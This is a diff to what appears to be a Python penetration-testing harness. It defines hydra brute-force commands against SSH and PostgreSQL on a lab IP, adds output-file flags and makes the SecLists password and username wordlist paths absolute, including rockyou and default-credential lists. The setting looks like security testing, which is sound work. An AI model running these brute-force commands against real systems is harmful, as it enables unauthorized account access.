@@ -29,7 +29,7 @@ logging.basicConfig(level=logging.INFO, datefmt="%H:%M:%S")
 bforce_payloads: list[GenericPayload] = []
 bforce_payloads.append(
     genPayload(
-        command="timeout 300 hydra -L {username_list} -P {password_list} {target_ip} -s 22 ssh ",
+        command="timeout 300 hydra -L {username_list} -P {password_list} {target_ip} -s 22 ssh -o hydra.txt ",
         description="perform a bruteforce attack against local SSH service",
         limits="305s",
         offset="500ms",
@@ -41,7 +41,7 @@ bforce_payloads.append(
 # we need to setup a basic postgres instance for testing
 bforce_payloads.append(
     genPayload(
-        command="timeout 300 hydra -L {username_list} -P {password_list} {target_ip} -s 5432 postgres ",
+        command="timeout 300 hydra -L {username_list} -P {password_list} {target_ip} -s 5432 postgres -o hydra.txt ",
         description="perform a bruteforce attack against local testing database",
         limits="305s",
         offset="200ms",
@@ -99,14 +99,14 @@ tartget_ip = "10.10.10.103"
 # Password Lists:
 password_lists = [
     "/opt/SecLists/rockyou/rockyou.txt",
-    "dmiessler-SecLists/Passwords/Default-Credentials/default-passwords.txt",
-    "dmiessler-SecLists/Passwords/Common-Credentials/Pwdb_top-10000.txt",
-    "dmiessler-SecLists/Passwords/Common-Credentials/2025-199_most_used_passwords.txt",
+    "/opt/SecLists/dmiessler-SecLists/Passwords/Default-Credentials/default-passwords.txt",
+    "/opt/SecLists/dmiessler-SecLists/Passwords/Common-Credentials/Pwdb_top-10000.txt",
+    "/opt/SecLists/dmiessler-SecLists/Passwords/Common-Credentials/2025-199_most_used_passwords.txt",
 ]
 
 username_lists = [
-    "dmiessler-SecLists/Usernames/cirt-default-usernames.txt",
-    "dmiessler-SecLists/Usernames/top-usernames-shortlist.txt",
+    "/opt/SecLists/dmiessler-SecLists/Usernames/cirt-default-usernames.txt",
+    "/opt/SecLists/dmiessler-SecLists/Usernames/top-usernames-shortlist.txt",
 ]
 
 
